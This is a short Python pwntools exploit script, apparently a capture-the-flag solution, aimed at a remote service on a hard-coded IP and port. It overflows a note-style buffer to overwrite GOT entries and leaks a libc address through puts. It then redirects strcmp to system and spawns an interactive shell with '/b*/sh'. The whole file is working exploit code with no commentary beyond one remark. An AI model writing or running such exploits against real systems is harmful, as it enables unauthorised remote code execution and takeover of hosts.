from pwn import *


r = remote('161.35.8.211', 9999)
puts_plt=0x602020
address=0x602010 # random address that we dont care if it gets overwritten
strcmp_plt=0x602050
offset_system=0x03f480
offset_puts=0x068f90

print(r.recvuntil('> '))

r.sendline('add')
r.sendline('a'*8+p64(puts_plt)+'b'*8+p64(address)+'c'*(480)+"\x01")
r.sendline('asdf')

print(r.recvuntil('> '))

r.sendline('print')

par = r.recvuntil('> ')

libc = u64(par.split("\n")[3][1:]+"\0\0")-offset_puts
print(hex(libc))

r.sendline('add')

r.sendline('a'*8+p64(strcmp_plt))
r.sendline(p64(libc+offset_system))
print(r.recvuntil('> '))

r.sendline('/b*/sh')

r.interactive()

r.close()